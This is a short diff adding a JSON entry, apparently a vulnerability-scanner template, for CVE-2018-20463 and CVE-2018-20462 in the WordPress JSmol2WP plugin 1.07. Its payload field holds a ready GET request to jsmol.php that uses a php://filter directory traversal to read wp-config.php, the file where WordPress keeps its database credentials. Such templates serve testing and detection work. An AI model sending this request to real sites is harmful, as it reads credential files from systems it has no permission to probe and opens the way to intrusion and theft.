@@ -1,0 +1,14 @@
+{
+    "categories":["LFI", "RFI"],
+    "tags": ["wordpress","plugin","jsmol2wp","lfi","CVE-2018-20463","CVE-2018-20462","local file inclusion"],
+    "description":"WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string",
+    "payload":
+        {
+        "route":"/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php",   
+        "method":"GET",
+        "headers":{},
+        "body":{},
+        "query":{}
+        }
+    }
+    
